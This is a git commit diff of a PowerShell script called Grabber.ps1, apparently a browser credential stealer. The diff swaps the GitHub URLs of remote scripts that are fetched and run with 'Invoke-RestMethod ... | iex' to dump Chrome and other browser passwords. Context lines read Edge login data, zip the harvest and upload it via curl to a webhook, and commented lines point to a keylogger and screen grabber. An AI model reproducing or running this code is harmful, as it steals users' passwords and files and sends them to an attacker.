f1e18e3606d40af80be012d29fffe2e7b44c26bc
Maradona <63970413+bindas88@users.noreply.github.com>
2024-09-03 05:37:27 +0700

    Update Grabber.ps1

--- Grabber.ps1
+++ Grabber.ps1
@@ -23,7 +23,7 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 
 Add-Type -AssemblyName System.Windows.Forms
 # dump pass chrome
-Invoke-RestMethod https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/Chrome80Dp.ps1 | iex
 # WMI Classes
 $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
 $userInfo = Get-WmiObject -Class Win32_UserAccount
@@ -340,7 +340,7 @@ if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {
 compress-archive -path "$outpath" -destinationpath "$outpath.zip" -force
 curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $hookurl
 # Grab pass browserpassview
-Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/WbGrab.ps1 | iex
 # keylogchrome
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/Screen-Party.ps1 | iex
